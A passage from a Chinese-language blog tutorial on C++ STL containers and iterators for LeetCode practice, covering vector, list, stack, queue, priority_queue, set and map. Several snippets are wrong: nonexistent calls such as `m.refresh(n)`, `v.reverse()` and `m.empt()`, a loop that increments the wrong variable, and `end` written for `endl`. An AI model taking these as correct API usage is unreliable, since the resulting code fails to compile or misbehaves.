來讓compiler來進行自動型別判別，<strong>compiler 會依據初始值的型別來決定變數的型別</strong></p><p>可以將for迴圈改成下面這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it=v.<span class="built_in">begin</span>(); it!=v.<span class="built_in">end</span>(); ++i)&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>對於 <code>vector</code> 來說，這算是一種random access 的 iterator，甚麼事random access?</p><h2 id="Random-Access"><a href="#Random-Access" class="headerlink" title="Random Access"></a>Random Access</h2><p><strong>若一個 container 可以在 $O(1)$ 複雜度進行存取，則它就具有 random access 的特性</strong></p><p>如果是為了刷題，會使用到的迭代器也隨著容器種類有所不同，可以參考下面表格</p><table><thead><tr><th>Iterator Type</th><th>Description</th><th>Container</th></tr></thead><tbody><tr><td>Bidirectional iterator</td><td>Read and Writes forward and backward</td><td>list,set,multiset,map,multimap</td></tr><tr><td>Random access iterator</td><td>Read and Write with random access</td><td>vector,deque,array,string</td></tr></tbody></table><h1 id="常見-STL-容器"><a href="#常見-STL-容器" class="headerlink" title="常見 STL 容器"></a>常見 STL 容器</h1><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><p>可以想成是一個動態的陣列</p><ul><li>可以在 $O(1)$ 時間內存取跟修改元素</li><li>在集合的中間修改元素會是 $O(n)$，<strong>一般建議將要刪除的值先swap到最後，然後再刪除。</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Vector-初始化"><a href="#Vector-初始化" class="headerlink" title="Vector 初始化"></a>Vector 初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 宣告一個 int vector</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宣告一個長度為N的 T型別的 Vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宣告一個長度為N的 int Vector，並且初始化成 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 將set中的資料初始化成 vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(s.begin(), s.end())</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Subvector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">sub</span><span class="params">(v.begin(),v.begin()+<span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2維Vector</span></span><br><span class="line">vector&lt;vector&lt;T&gt;&gt; v2d;</span><br><span class="line"></span><br><span class="line"><span class="comment">//宣告一個2維Vector，大小為 nxm</span></span><br><span class="line">vector&lt;vector&lt;T&gt;&gt; <span class="built_in">v_2d1</span>(n, <span class="built_in">vector</span>&lt;T&gt;(m));</span><br></pre></td></tr></table></figure><h3 id="Vector-常見操作"><a href="#Vector-常見操作" class="headerlink" title="Vector 常見操作"></a>Vector 常見操作</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v.<span class="built_in">empty</span>();</span><br><span class="line">v.<span class="built_in">size</span>();</span><br><span class="line">v.<span class="built_in">front</span>();</span><br><span class="line">v.<span class="built_in">back</span>();</span><br><span class="line"></span><br><span class="line">v.<span class="built_in">push_back</span>();    <span class="comment">// 將obj推到vector的最後端</span></span><br><span class="line">v.<span class="built_in">pop_back</span>();  <span class="comment">// 將vector的最後端obj移除</span></span><br><span class="line">v.<span class="built_in">insert</span>();      <span class="comment">// 插入到指定位置</span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>(), target); <span class="comment">// 加入target到最前面</span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>() + n, target); <span class="comment">// 加入taret到任意位置, n &lt;= v.size()</span></span><br><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">end</span>(), v2.<span class="built_in">begin</span>(), v2.<span class="built_in">end</span>()); <span class="comment">// 將 v2 插入到 v1 的最尾端</span></span><br><span class="line">v.<span class="built_in">reverse</span>(first, last); <span class="comment">// 反轉vector從first到last</span></span><br><span class="line">v.<span class="built_in">erase</span>();  <span class="comment">// 移除某個指定位置element</span></span><br><span class="line">v.<span class="built_in">clear</span>();       <span class="comment">// 清除全部element</span></span><br></pre></td></tr></table></figure><p>最後面的 <code>v.erase()</code>，其實如果不在乎順序的話可以改成使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">swap</span>(v[n], v.<span class="built_in">back</span>()); <span class="comment">// 交換n和最後一個位置</span></span><br></pre></td></tr></table></figure><p>剩下還有一些操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Traversal</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    cout &lt;&lt; v[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> it = <span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), val); <span class="comment">// 尋找第一個val出現的位置。</span></span><br><span class="line">v.<span class="built_in">count</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), val); <span class="comment">// 計算範圍內val出現的次數</span></span><br></pre></td></tr></table></figure><p>Traversal 還可以寫成下面的形式，但這個就會提到 Iterator，稍後會提到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p>移動或是刪除等操作都是 $O(1)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// delcare list container</span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; l;</span><br></pre></td></tr></table></figure><p>常見操作:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">l.<span class="built_in">empty</span>();</span><br><span class="line">l.<span class="built_in">size</span>();</span><br><span class="line">l.<span class="built_in">push_back</span>();</span><br><span class="line">l.<span class="built_in">pop_back</span>();</span><br><span class="line">l.<span class="built_in">push_front</span>();</span><br><span class="line">l.<span class="built_in">pop_front</span>();</span><br></pre></td></tr></table></figure><p>將一個list中的值移到另一個list中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l.<span class="built_in">splice</span>(iterator pos, list&amp; x); <span class="comment">// 把x所有的element接到l中pos的位置。</span></span><br><span class="line">l.<span class="built_in">splice</span> (iterator pos, list&amp; x, iterator i); <span class="comment">// 把i單一個element從x中搬移到l中pos的位置。</span></span><br><span class="line">l.<span class="built_in">splice</span> (iterator pos, list&amp; x, iterator first, iterator last); <span class="comment">// 把x中從first到last的element搬到l中pos的位置。</span></span><br></pre></td></tr></table></figure><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>特性: LIFO(Last-In-First-Out)，Stack是object的有限序列，並滿足序列中被刪除、檢索和修改的項只能是最近插入序列的obj</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="comment">// declare a stack</span></span><br><span class="line">stack&lt;T&gt; s;</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">s.<span class="built_in">empty</span>(); <span class="comment">//測試堆疊是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">s.<span class="built_in">size</span>(); <span class="comment">//回傳目前堆疊中有幾個元素。</span></span><br><span class="line">s.<span class="built_in">push</span>(); <span class="comment">//在堆疊中加入一個元素。</span></span><br><span class="line">s.<span class="built_in">pop</span>(); <span class="comment">//移除目前堆疊中最上層元素</span></span><br><span class="line">s.<span class="built_in">top</span>(); <span class="comment">//取得目前堆疊中最上層元素</span></span><br></pre></td></tr></table></figure><h2 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h2><p>特性: FIFO(First-In-First-Out)，所以插入只可以在尾部進行，刪除、檢索和修改只允許從頭部進行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="comment">// declare a queue</span></span><br><span class="line">queue&lt;T&gt; q;</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">q.<span class="built_in">empty</span>(); <span class="comment">//測試佇列是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">q.<span class="built_in">size</span>(); <span class="comment">//回傳目前佇列中有幾個元素。</span></span><br><span class="line">q.<span class="built_in">push</span>(); <span class="comment">//在佇列中加入一個元素。</span></span><br><span class="line">q.<span class="built_in">pop</span>(); <span class="comment">//移除目前佇列中最前端元素 (即最早進入佇列的元素)。</span></span><br><span class="line">q.<span class="built_in">front</span>(); <span class="comment">//取得目前佇列中最前端元素的 reference</span></span><br></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>其實就是 <strong>heap</strong> 結構，常用於Dijkstra 演算法中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="comment">// declare a priorityqueue</span></span><br><span class="line">priority_queue&lt;T&gt; pq;    <span class="comment">// 預設為最大在上面</span></span><br><span class="line">priority_queue&lt;T, vector&lt;T&gt;, greater&lt;T&gt; &gt; pq;  <span class="comment">//改成由小排到大</span></span><br><span class="line"><span class="comment">// 自己定義compare function</span></span><br><span class="line"><span class="comment">// 從小排到大，與sort的cmp相反</span></span><br><span class="line"><span class="keyword">auto</span> cmp = [](<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, <span class="keyword">decltype</span>(cmp)&gt; <span class="built_in">pq</span>(cmp);</span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">pq.<span class="built_in">empty</span>(); <span class="comment">//測試優先佇列是否為空。若為空回傳 true，反之 false。</span></span><br><span class="line">pq.<span class="built_in">size</span>(); <span class="comment">//回傳目前優先佇列中有幾個元素。</span></span><br><span class="line">pq.<span class="built_in">push</span>(); <span class="comment">//在優先佇列中加入一個元素。</span></span><br><span class="line">pq.<span class="built_in">pop</span>(); <span class="comment">//移除目前優先佇列中優先順序最高的元素。</span></span><br><span class="line">pq.<span class="built_in">top</span>(); <span class="comment">//取得目前優先佇列中優先順序最高元素的 constant reference。</span></span><br></pre></td></tr></table></figure><p>要注意的是，PQ 的 <code>pop</code> 跟 <code>push</code> 複雜度會是 $O(Log n)$</p><h3 id="make-heap-操作"><a href="#make-heap-操作" class="headerlink" title="make heap 操作"></a>make heap 操作</h3><p>有個省空間的方法，就是透過 <code>make_heap</code> 來讓 vector 變成 heap，這樣空間複雜度會變成 $O(1)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; nums&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// 預設是max-heap</span></span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// max-heap</span></span><br><span class="line"><span class="built_in">make_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// min-heap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pop，因為pop_heap只是把element往最後移動，</span></span><br><span class="line"><span class="comment">// 所以還要pop_back()</span></span><br><span class="line"><span class="built_in">pop_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// for max-heap</span></span><br><span class="line"><span class="built_in">pop_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// for min-heap</span></span><br><span class="line">nums.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// push, 需要先把element放到最後</span></span><br><span class="line">nums.<span class="built_in">push_back</span>(val);</span><br><span class="line"><span class="built_in">push_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// for max-heap</span></span><br><span class="line"><span class="built_in">push_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// for min-heap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sort_heap</span></span><br><span class="line"><span class="built_in">sort_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); <span class="comment">// 升序排序</span></span><br><span class="line"><span class="built_in">sort_heap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// 降序排序</span></span><br></pre></td></tr></table></figure><h2 id="Set-和-MultiSet"><a href="#Set-和-MultiSet" class="headerlink" title="Set 和 MultiSet"></a>Set 和 MultiSet</h2><p>Set 就是集合<br><img src="/img/LeetCode/C++_STL/set.png"></p><p>預設set會從小到大排序，set容器裡面的元素是唯一的，具有不重複的特性<br>而 multiset可以允許元素重複。unordered_set 不排序的set。unordered_multiset 不排序的multiset。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="comment">// declare a set</span></span><br><span class="line">set&lt;T&gt; s;</span><br><span class="line">set&lt;T&gt; s&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;; <span class="comment">// with initial value</span></span><br><span class="line"><span class="function">set&lt;T&gt; <span class="title">s</span><span class="params">(vector&lt;T&gt;)</span></span>;    <span class="comment">// 可以輸入vector</span></span><br><span class="line"><span class="function">set&lt;T&gt; <span class="title">s</span><span class="params">(vector.begin(), vector.end())</span></span>; <span class="comment">// import data from vector，方便查找資料</span></span><br><span class="line">set&lt;T,greater&lt;T&gt;&gt; s2; <span class="comment">// 從大排到小</span></span><br><span class="line">multiset&lt;T&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">s.<span class="built_in">empty</span>();</span><br><span class="line">s.<span class="built_in">size</span>();</span><br><span class="line">s.<span class="built_in">insert</span>();</span><br><span class="line"><span class="keyword">auto</span> it = s.<span class="built_in">insert</span>(val); <span class="comment">// 可以取得insert之後的位置</span></span><br><span class="line">s.<span class="built_in">erase</span>();    <span class="comment">// 可以傳入key或是iterator, 如果傳入為key會刪除重複的key</span></span><br><span class="line"><span class="comment">//所以必須先使用find找出value的iterator，這樣才可以確保只刪除一個</span></span><br><span class="line">s.<span class="built_in">erase</span>(s.<span class="built_in">find</span>(value));</span><br><span class="line">s.<span class="built_in">clear</span>();</span><br><span class="line">s.<span class="built_in">count</span>(); <span class="comment">// 看看elemet有幾個，因為set只容許一個，所以等於是判斷有無。multiset會回傳個數。</span></span><br><span class="line">s.<span class="built_in">find</span>(); <span class="comment">// 回傳iterator，所以還要判斷使否是s.end();</span></span><br><span class="line"><span class="comment">// convert set to vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(s.begin(), s.end())</span></span>;</span><br><span class="line"><span class="comment">// Traversal</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp; item : s) &#123;    <span class="comment">//宣告成const前提是不會在function內修改item的值。</span></span><br><span class="line">    cout &lt;&lt; item &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = s.<span class="built_in">rbegin</span>(); it != s.<span class="built_in">rend</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取第一個和最後一個element</span></span><br><span class="line">cout &lt;&lt; *s.<span class="built_in">begin</span>() &lt;&lt; endl;    <span class="comment">// 取第一個element的值</span></span><br><span class="line">cout &lt;&lt; *s.<span class="built_in">rbegin</span>() &lt;&lt; endl;   <span class="comment">// 取最後一個element的值，不可以直接使用end()</span></span><br><span class="line">cout &lt;&lt; *(--s.<span class="built_in">end</span>()) &lt;&lt; end;   <span class="comment">// 必須使用end()的前一個</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Map-和-MulitMap"><a href="#Map-和-MulitMap" class="headerlink" title="Map 和 MulitMap"></a>Map 和 MulitMap</h2><p>Map 就像是一個對應表，使用key-value pair 來去實現一對一的映射關係<br><img src="/img/LeetCode/C++_STL/map.png"></p><ul><li>預設也是從小到大排序</li><li>multimap 允許多個相同的key-value pair。</li><li>unordered_map 不排序的map。</li><li>unordered_multimap 不排序的multimap。</li></ul><p>簡單範例:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; m;     <span class="comment">// 從 string 對應到 int</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 設定對應的值</span></span><br><span class="line">    m[<span class="string">&quot;one&quot;</span>] = <span class="number">1</span>;       <span class="comment">// &quot;one&quot; -&gt; 1</span></span><br><span class="line">    m[<span class="string">&quot;two&quot;</span>] = <span class="number">2</span>;       <span class="comment">// &quot;two&quot; -&gt; 2</span></span><br><span class="line">    m[<span class="string">&quot;three&quot;</span>] = <span class="number">3</span>;     <span class="comment">// &quot;three&quot; -&gt; 3</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; m.<span class="built_in">count</span>(<span class="string">&quot;two&quot;</span>) &lt;&lt; endl;     <span class="comment">// 1 -&gt; 有對應</span></span><br><span class="line">    cout &lt;&lt; m.<span class="built_in">count</span>(<span class="string">&quot;ten&quot;</span>) &lt;&lt; endl;     <span class="comment">// 0 -&gt; 沒有對應</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="comment">//declare a map</span></span><br><span class="line">map&lt;T, U&gt; m;</span><br><span class="line">map&lt;T, U, greater&lt;T&gt;&gt; m; <span class="comment">// 從大排到小</span></span><br><span class="line"><span class="comment">// 常用function</span></span><br><span class="line">m.<span class="built_in">empt</span>();</span><br><span class="line">m.<span class="built_in">size</span>();</span><br><span class="line">m.<span class="built_in">insert</span>();</span><br><span class="line">m.<span class="built_in">erase</span>();  <span class="comment">// 刪除element</span></span><br><span class="line">m.<span class="built_in">clear</span>();  <span class="comment">// 清空所有的element</span></span><br><span class="line">m.<span class="built_in">count</span>();  <span class="comment">// 回傳有幾個element</span></span><br><span class="line">m.<span class="built_in">find</span>();   <span class="comment">// 回傳iterator</span></span><br><span class="line">m.<span class="built_in">swap</span>(x);  <span class="comment">// 把m和x的資料交換，m和x必須一樣的type</span></span><br><span class="line"><span class="comment">// Traversal by reference</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : m) &#123;</span><br><span class="line">    cout &lt;&lt; item.first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; item.second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Traversal by reference with name</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : m) &#123;</span><br><span class="line">    cout &lt;&lt; key &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; value &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Traversal by iterator</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 使用prev()取得iterator的前一個</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">prev</span>(it)-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">prev</span>(it)-&gt;second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取第一個和最後一個element</span></span><br><span class="line">cout &lt;&lt; m.<span class="built_in">begin</span>()-&gt;first &lt;&lt; endl;    <span class="comment">// 取第一個element的值</span></span><br><span class="line">cout &lt;&lt; m.<span class="built_in">rbegin</span>()-&gt;first &lt;&lt; endl;   <span class="comment">// 取最後一個element的值，不可以直接使用end()</span></span><br><span class="line">cout &lt;&lt; (--m.<span class="built_in">end</span>())-&gt;first &lt;&lt; end;   <span class="comment">// 必須使用end()的前一個</span></span><br></pre></td></tr></table></figure><blockquote><p>map 的底層實現是用紅黑樹，因此它的對應都是按照key去做排序的，因此插入，查找，刪除等操作的複雜度都是 $O(Log n)$<br>unordered_map 的底層實現則是用hash table，是無序的，因此複雜度會是 $O(1)$</p></blockquote><p>使用unordered_map的時候，根據key產生出來的hash來查找value。既然是hash就會有碰撞問題</p><blockquote><p>As we know a Bucket is a slot in the container’s internal hash table to which all the element are assigned based on the hash value of their key . Buckets are numbered from 0 to bucket_count.</p></blockquote><p>如果增加的數目超出bucket_count，map就會自動變大bucket_slot，並且重新計算所有item的hash。</p><blockquote><p>When the Load Factor(load_factor) reaches a certain threshold, the container increases the number of buckets and rehashes the map.</p></blockquote><p>使用以下的程式碼，就是放大bucket到n，並且重新計算hash table。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="built_in">refresh</span>(n);</span><br></pre></td></tr></table></figure><p>如果我們事先知道大小可以使用以下function直接保留bucket到n，避免超出threshold需要放大container。因為事先保留了n個bucket也可以避免hash collision。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="built_in">reserve</span>(n);</span><br></pre></td></tr></table></figure><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH">https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH</a><br>[2] <a href="https://jasonblog.github.io/note/c++/stl_rong_qi_4e0029_-_ji_ben_jie_shao.html">https://jasonblog.github.io/note/c++/stl_rong_qi_4e0029_-_ji_ben_jie_shao.html</a><br>[3] <a href="https://hackmd.io/@meyr543/BkgMaiV6Y#Vector">https://hackmd.io/@meyr543/BkgMaiV6Y#Vector</a><br>[4] <a 